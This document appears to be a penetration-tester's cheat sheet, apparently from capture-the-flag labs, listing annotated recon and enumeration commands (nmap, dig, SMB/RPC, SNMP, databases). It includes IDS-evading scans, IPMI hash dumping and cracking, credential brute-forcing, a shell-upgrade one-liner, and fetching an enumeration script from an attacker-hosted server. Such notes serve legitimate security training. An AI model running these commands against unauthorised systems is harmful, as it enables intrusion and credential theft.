## **NMAP - Network Scanning & Enumeration**

```bash
### Basic Fast Scans
nmap -F X.X.X.X                                  # Fast scan: Quickly checks for the most likely open services.
nmap -T4 -F X.X.X.X                              # Fast scan with aggressive timing (T4) to speed up execution on stable networks.
nmap -sS -F X.X.X.X                              # Fast Stealth (SYN) scan: Checks top 100 ports without completing the TCP handshake.
nmap -sV X.X.X.X                                 # Version detection: Probes open ports to determine what service and version are running.
nmap -sV --top-ports 100 X.X.X.X                 # Version detection on the top 100 ports for a balance of speed and detail.
nmap -A -sV -p 1521 X.X.X.X                      # Aggressive Oracle scan: Intense version and OS fingerprinting on Oracle DB port.
nmap -sV -sC X.X.X.X                             # Service/Script scan: Combining versioning with Nmap's default "safe" scripts.
nmap -sV -sC DOMAIN.COM                          # Service/Script scan: Targeting a hostname to resolve and enumerate services.
nmap -sV -sC SUB.DOMAIN.COM                      # Service/Script scan: DNS-based target targeting internal application servers.
nmap -sV --open -oA REPORT_FILENAME X.X.X.X      # Version scan: Shows only open ports and saves output in all formats (Nmap, XML, Grepable).
nmap -sV -p21 -sC -A X.X.X.X                     # Intense FTP scan: Targeted versioning, default scripts, and aggressive OS detection on port 21.
nmap --privileged -oA nmap.log -sC -sV X.X.X.X   # Privileged scan: Ensures raw socket access for accurate OS/Script results; logs to "nmap.log".
nmap -p- --open -oA REPORT_FILENAME X.X.X.X      # Full scan: Checks all 65,535 TCP ports for open services and logs all results.
nmap -sC -p 22,80 -oA REPORT_FILENAME X.X.X.X    # Targeted script scan: Runs default NSE scripts against SSH and HTTP ports only.
nmap -A -p 110,143,993,995 X.X.X.X               # Aggressive scan: Performs OS detection, versioning, and traceroute on Mail ports.
nmap -A -sU -sT -p 623 X.X.X.X                   # Combined TCP/UDP aggressive scan: Targeting IPMI (port 623) for hardware management info.
nmap -A -sU -sS -p 53 X.X.X.X                    # Aggressive DNS scan: Checks both TCP and UDP port 53 for DNS server details.
nmap -A DOMAIN.COM                               # Comprehensive aggressive scan: Full OS, version, and script discovery on the domain.
nmap -sU -A -p 161,162 X.X.X.X                   # Aggressive UDP scan: Specifically targets SNMP ports to find network device info.

### Script-specific Scans
nmap -sU -sV -p 161 --script=snmp-* X.X.X.X      # UDP SNMP Discovery: Uses all SNMP-related scripts to extract community strings or system info.
nmap -sV -p 53 --script=dns* X.X.X.X             # DNS script scan: Runs all scripts starting with "dns" to find records or vulnerabilities.
nmap -sV --script mysql* -p 3306 X.X.X.X         # MySQL script scan: Runs all MySQL scripts to find users, databases, or vulnerabilities.
nmap -sV --script oracle* -p 1521 X.X.X.X        # Oracle script scan: Specifically runs Oracle-based NSE scripts for enumeration.
nmap -sV -p 25 --script "smtp*" X.X.X.X          # SMTP script scan: Uses SMTP scripts to check for open relays or user enumeration.
nmap -Pn --script ftp-anon -p21 X.X.X.X          # FTP Anonymous Check: Skips ping and checks if the FTP server allows guest/anonymous logins.
nmap -sV -p 53 --script=dns* --script-args dnszonetransfer.domain=DOMAIN.COM,dns-brute.domain=DOMAIN.COM X.X.X.X  # DNS brute/Zone transfer: Attempting to dump all DNS records for a domain.
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password,ms-sql-config,ms-sql-dump-hashes X.X.X.X # MS-SQL Audit: Runs a suite of scripts to audit SQL security and configuration.
nmap -Pn -sV -p 1433,1434,49152-49200 --script ms-sql-info X.X.X.X       # MS-SQL discovery: Skips host discovery (-Pn) and identifies SQL instances on common ports.
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum X.X.X.X           # HTTP Enumeration: Searches for common directories and files on the web server.
nmap -sV --script=http-enum -oA kc_nmap_http_enum X.X.X.X                # HTTP Enumeration: Attempts to find hidden web paths and logs the results.
nmap -sC -sV -Pn -n -T4 --script nfs* -p 111,2049 X.X.X.X                # NFS Enumeration: Runs NFS scripts against RPC and NFS ports while skipping DNS resolution.
nmap --privileged -sV -sC -d -vv -Pn -n -T4 -p 111,2049 -oG - X.X.X.X    # Verbose NFS scan: High-debug output of NFS services, outputting in Grepable format to stdout (-).
nmap -sS -Pn -n -T2 --max-retries 1 --scan-delay 200ms --max-rate 25 --top-ports 20 --reason -oN nmap_quiet_top20.txt X.X.X.X # Stealthy scan: Slow timing and rate-limiting to evade IDS while checking the top 20 ports.
nmap -sS -Pn -n -T2 --max-retries 1 --scan-delay 200ms --max-rate 25 -O --osscan-limit --max-os-tries 1 -p 22,80,21 --reason -oN nmap_quiet_os.txt X.X.X.X # Stealthy OS detection: Low-profile OS fingerprinting on specific common ports.
nmap -sS -sU -Pn -n -T2 --max-retries 1 --scan-delay 300ms --max-rate 20 -p T:53,U:53 -sV --version-light --script dns-nsid --reason -oN nmap_dns_version_53.txt X.X.X.X # Quiet DNS Versioning: Checks both TCP/UDP port 53 for DNS server IDs with minimal traffic.
nmap -sS -Pn -n -T2 --max-retries 1 --scan-delay 200ms --max-rate 25 --top-ports 50 --reason -oN svcdisc_top50.txt X.X.X.X # Quiet Service Discovery: Stealthily checks top 50 ports and shows the reason for port status.

```

## **DIG - DNS Enumeration**

```bash
dig @X.X.X.X DOMAIN.COM AXFR                    # Zone Transfer: Attempts to retrieve the entire DNS zone file from the target server.
dig @X.X.X.X root.DOMAIN.COM AXFR               # Zone Transfer (Root): Attempts a zone transfer for the 'root' subdomain.
dig any DOMAIN.COM @X.X.X.X                     # Query All: Requests all available DNS records for the specified domain.
dig @X.X.X.X -x X.X.X.X                         # Reverse Lookup: Finds the PTR record (hostname) associated with a given IP address.
dig @X.X.X.X version.bind CHAOS TXT             # Version Fingerprinting: Queries the BIND version of the DNS server using the CHAOS class.
dig @X.X.X.X DOMAIN.COM ANY                     # Comprehensive Query: Similar to 'any', requests all known DNS records.
dig @X.X.X.X DOMAIN.COM NS                      # Name Server Lookup: Identifies the authoritative name servers for the domain.
dig @X.X.X.X DOMAIN.COM MX                      # Mail Exchange Lookup: Identifies the servers responsible for handling email for the domain.
dig @X.X.X.X DOMAIN.COM A                       # A-Record Lookup: Finds the IPv4 address associated with the domain name.
dig @X.X.X.X DOMAIN.COM AXFR                    # Zone Transfer: General attempt to download the domain's zone information.
dig @X.X.X.X chaos txt version.bind +short      # Short Version Query: Displays only the BIND version string without extra headers.
dig axfr @X.X.X.X DOMAIN.COM                    # Zone Transfer (Alternative Syntax): Attempts to pull the full zone file.

```
## **DNSENUM - DNS Subdomain Enumeration**

```bash
dnsenum --dnsserver X.X.X.X --enum -p 0 -s 0 -o subdomains.txt -f ./subdomains-top1million-110000.txt DOMAIN.COM # Automated DNS Recon: Brute-forces subdomains, checks for zone transfers, and saves to file.

```
## **NSLOOKUP - DNS Queries**

```bash
nslookup -query=NS DOMAIN.COM X.X.X.X            # Name Server Query: Uses nslookup to find authoritative name servers using a specific DNS server.

```

## **CURL - HTTP/IMAP/POP3 Requests**

```bash
curl -v imap://X.X.X.X                          # IMAP Banner Grabbing: Verbose connection to check IMAP service status.
curl -v pop3://X.X.X.X                          # POP3 Banner Grabbing: Verbose connection to check POP3 service status.
curl -v -k 'imaps://X.X.X.X'                    # Secure IMAP: Connects via IMAPS, ignoring SSL certificate warnings (-k).
curl -v --insecure imap://X.X.X.X               # IMAP Connection: Explicitly ignores SSL/TLS certificate validation.
curl -v --insecure pop3://X.X.X.X               # POP3 Connection: Explicitly ignores SSL/TLS certificate validation.
curl -k --user USERNAME:PASSWORD imap://X.X.X.X # IMAP Auth: Attempts to log into an IMAP server with provided credentials.
curl -I http://SUB.DOMAIN.COM                   # HTTP Headers: Fetches the response headers (HEAD request) to identify the web server.
curl -I http://X.X.X.X:37666                    # HTTP Headers (Custom Port): Inspects headers of a web service on a non-standard port.
curl http://DOMAIN.COM:37666                    # HTTP Content: Retrieves the HTML body of the main page on a custom port.
curl http://SUB.DOMAIN.COM:37666/SUBFOLDER/     # Directory Check: Attempts to access a specific hidden directory.
curl http://X.X.X.X                             # Standard HTTP: Fetches the landing page of the target IP.
curl http://X.X.X.X/sitemap.xml                 # Sitemap Enumeration: Checks for a sitemap to discover hidden web pages.
curl http://X.X.X.X/SUBFOLDER/content/private/plugins/my_image/image.php # File Probe: Directly requests a specific PHP file to check for existence or execution.
curl --url 'imap://[target]' --user 'username:password' # IMAP Retrieval: Logs in to retrieve mail metadata or content.

```
## **OPENSSL - SSL/TLS Certificate Analysis**

```bash
openssl s_client -connect X.X.X.X:imaps         # SSL/TLS Analysis: Establishes a secure IMAPS connection to inspect the certificate chain.
openssl s_client -connect X.X.X.X:993 -quiet    # Secure IMAP Probe: Connects to port 993 silently, useful for checking if encryption is active.
openssl s_client -connect X.X.X.X:995 -quiet    # Secure POP3 Probe: Connects to port 995 silently for certificate validation.

```

## **NETCAT (NC) - Banner Grabbing & Protocol Interaction**

```bash
echo "A001 CAPABILITY" | nc X.X.X.X 143         # IMAP Capability: Sends a protocol-specific command to see supported IMAP features.
echo "CAPA" | nc X.X.X.X 110                    # POP3 Capability: Sends the CAPA command to list server-supported extensions.
echo "quit" | nc -nv X.X.X.X 110                # POP3 Quit: Connects to POP3 and immediately exits to grab the initial banner.
echo "a1 LOGOUT" | nc -nv X.X.X.X 143           # IMAP Logout: Connects to IMAP and closes the session to grab the banner.
echo -e "HELO test.com\nVRFY root\nVRFY admin\nVRFY XXXXXX\nVRFY fiona\nQUIT" | nc X.X.X.X 25 # SMTP User Enumeration: Uses VRFY to check if specific users exist on the mail server.
nc X.X.X.X 80                                   # HTTP Banner Grab: Manually connects to the web server (press Enter to see response).
nc -nv X.X.X.X 22                               # SSH Banner Grab: Connects to port 22 to see the specific SSH version string.

```

## **METASPLOIT - Exploitation Framework**

```bash
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS X.X.X.X; exploit; exit" # IPMI Version: Runs Metasploit module to identify the IPMI version.
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS X.X.X.X; set OUTPUT_JOHN_FILE /tmp/ipmi_hashes.txt; exploit; exit" # IPMI Hash Dump: Attempts to retrieve user password hashes for offline cracking.
msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; set RHOSTS X.X.X.X; exploit; exit" # MS-SQL Ping: Locates SQL instances and identifies configuration details.
msfconsole -q -x "use auxiliary/gather/enum_dns; set DOMAIN DOMAIN.COM; set NS X.X.X.X; run; exit" # DNS Enumeration: Automatically gathers common records and subdomains using Metasploit.

```

## **HASHCAT - Password Cracking**

```bash
hashcat -m 7300 -a 0 /tmp/ipmi_hash3.txt /usr/share/wordlists/rockyou.txt # IPMI Cracking: Uses mode 7300 (IPMI v2 RAKP) to brute-force a hash with a wordlist.

```

## **SMB/SAMBA Enumeration**

```bash
# SMBClient
smbclient //X.X.X.X/sambashare                                      # Share Access: Attempts to connect to a specific SMB share.
smbclient -L //X.X.X.X -N                                           # List Shares (Null): Lists available shares without requiring a password.
smbclient -L //X.X.X.X -U ''%''                                     # List Shares (Empty): Lists shares using an empty username/password string.
smbclient -L //X.X.X.X -U 'guest'%''                                # List Shares (Guest): Attempts to list shares as the 'guest' user.
smbclient //X.X.X.X/devshare -U 'USER%PASS' -c 'ls'                 # Remote List: Connects with credentials and immediately lists the directory.
smbclient //X.X.X.X/devshare -U 'USER%PASS' -c 'get important.txt'  # Download File: Connects and downloads a specific file.

# SMBMap
smbmap -H X.X.X.X                               # SMB Recon: Maps the target to show share permissions and disk contents.
smbmap -H X.X.X.X -u '' -p ''                   # Null Session Mapping: Checks permissions for an unauthenticated user.
smbmap -H X.X.X.X -u 'guest'                    # Guest Mapping: Checks permissions specifically for the guest account.

# RPCClient
rpcclient -U "" X.X.X.X                          # RPC Null Session: Establishes a shell to query the server via Remote Procedure Call.
rpcclient -U '' -N X.X.X.X -c 'srvinfo'          # Server Info: Queries OS and version info via RPC.
rpcclient -U '' -N X.X.X.X -c 'enumdomusers'     # User Enumeration: Lists all domain users via RPC.
rpcclient -U '' -N X.X.X.X -c 'enumdomgroups'    # Group Enumeration: Lists all domain groups.
rpcclient -U '' -N X.X.X.X -c 'querydominfo'     # Domain Info: Retrieves general domain and forest information.
rpcclient -U '' -N X.X.X.X -c 'getdompwinfo'     # Password Policy: Retrieves domain password complexity requirements.
rpcclient -U '' -N X.X.X.X -c 'netshareenumall'  # Share Enumeration: Lists all shares including administrative ones.

# Enum4linux
enum4linux -a X.X.X.X                            # Automated SMB Recon: Performs full enumeration (users, shares, groups, policies).

# NetExec (formerly CrackMapExec)
netexec smb X.X.X.X -u 'USER' -p 'PASS' --shares # Share Enumeration: Lists shares and checks permission levels for specific credentials.
netexec winrm X.X.X.X                            # WinRM Check: Identifies if the WinRM (Remote Management) service is active.
netexec winrm X.X.X.X -u '' -p ''                # WinRM Null: Attempts unauthenticated WinRM access.

```

## **NFS Enumeration**

```bash
sudo mount -t nfs -o nfsvers=3 X.X.X.X:/TechSupport /tmp/techsupport # Mount NFS: Attaches a remote NFS share to a local directory.
sudo ls -la /tmp/techsupport                    # File Listing: Views files and permissions on the mounted NFS share.
sudo cat /tmp/techsupport/ticket*.txt           # Read Data: Views the contents of text files on the remote share.
sudo find /tmp/techsupport -type f -size +0     # File Search: Finds non-empty files within the mounted share.
sudo umount /tmp/techsupport                    # Unmount: Safely detaches the NFS share from the local system.

```

## **SNMP Enumeration**

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt X.X.X.X # SNMP Brute: Brute-forces community strings to find a valid access name.
snmpwalk -v 2c -c public X.X.X.X                # SNMP Dump: Enumerates all OIDs using the 'public' community string.
snmpwalk -v2c -c backup X.X.X.X                 # SNMP Dump (Backup): Attempts enumeration using the 'backup' community string.
braa public@X.X.X.X:.1.3.6.1.2.1.1.1.0          # SNMP Braa: Queries specific MIB/OIDs in bulk for efficiency.

```

## **SMTP User Enumeration**

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t X.X.X.X # VRFY Method: Checks for user existence using the SMTP VRFY command.
smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/unix_users.txt -t X.X.X.X -D DOMAIN.COM # RCPT Method: Enumerates users by simulating mail delivery to them.

```

## **MySQL Client**

```bash
mysql -u XXXXXX -pXXXXXX -h X.X.X.X --ssl-verify-server-cert=false # MySQL Connect: Logs into a remote MySQL server with credentials.
mysql -u XXXXXX -p                             # MySQL Local: Connects to the local database, prompting for a password.

```

## **MSSQL (Impacket)**

```bash
mssqlclient.py XXXXXX:XXXXXX@X.X.X.X -windows-auth # MSSQL Auth: Connects to a SQL server using Windows Authentication.
mssqlclient.py USER:PASS@X.X.X.X                # MSSQL Direct: Connects using standard SQL server authentication.

```

## **Oracle Database (ODAT)**

```bash
odat all -s X.X.X.X -p 1521 -d XE               # Oracle Full Scan: Runs all ODAT modules to find vulnerabilities in an Oracle instance.
odat tnscmd -s X.X.X.X -p 1521 --ping           # Oracle TNS Ping: Checks if the Oracle TNS listener is reachable.
odat passwordguesser -s X.X.X.X -p 1521 -d XE --accounts-file ... # Oracle Brute: Attempts to find valid credentials for the database.

```

## **SSH**

```bash
ssh -i /tmp/ceil_id_rsa -o StrictHostKeyChecking=no USER@X.X.X.X 'whoami; hostname; pwd; ls -la' # SSH Exec: Uses a private key to run a series of commands on a remote host.
ssh -i /tmp/ceil_id_rsa -o StrictHostKeyChecking=no USER@X.X.X.X 'find / -name "flag.txt" 2>/dev/null' # Remote Find: Searches the entire remote filesystem for a specific file.
python3 -c 'import pty; pty.spawn("/bin/bash")' # Shell Stabilize: Upgrades a limited netcat shell to a fully interactive TTY.

```

## **FTP**

```bash
ftp -n X.X.X.X PORT                             # FTP Connect: Initiates a connection to a specific FTP port without auto-login.

```

## **GOBUSTER - Web Directory/VHost Bruteforcing**

```bash
gobuster dir -u http://X.X.X.X/SUBFOLDER/ --wordlist ... # Dir Brute: Finds hidden directories inside the /SUBFOLDER path.
gobuster vhost -u http://DOMAIN.COM -w ... --append-domain # VHost Brute: Finds subdomains by changing the Host header in HTTP requests.

```

## **NIKTO - Web Vulnerability Scanner**

```bash
nikto -h SUB.DOMAIN.COM -Tuning b               # Web Vulnerability Scan: Scans the host for software vulnerabilities (Tuning b = software bails).

```

## **WHATWEB - Web Fingerprinting**

```bash
whatweb http://SUB.DOMAIN.COM                   # Web Fingerprint: Identifies CMS, server version, and technologies used by the site.

```

## **WAFW00F - WAF Detection**

```bash
wafw00f http://SUB.DOMAIN.COM                   # WAF Check: Detects if a Web Application Firewall (like Cloudflare) is protecting the site.

```

## **Subdomain Enumeration (Bash Loop)**

```bash
for sub in $(cat wordlist.txt);do dig $sub.DOMAIN.COM @X.X.X.X ... # Bash DNS Recon: Custom loop to manually verify subdomains via dig.

```

## **Remote Desktop**

```bash
xfreerdp /v:X.X.X.X /u:USERNAME /p:PASSWORD /cert-ignore # RDP Connection: Connects to a Windows remote desktop session.

```

## **File Transfer**

```bash
sudo python3 -m http.server 8080                # Python Web Server: Quickly hosts current directory files for remote download.
wget http://10.10.14.237:8080/LinEnum.sh        # File Download: Retrieves a script from a remote web server.

```

## **Wordlist Downloads**

```bash
wget https://raw.githubusercontent.com/...      # Wordlist Acquisition: Downloads common subdomain and discovery lists from GitHub.

```
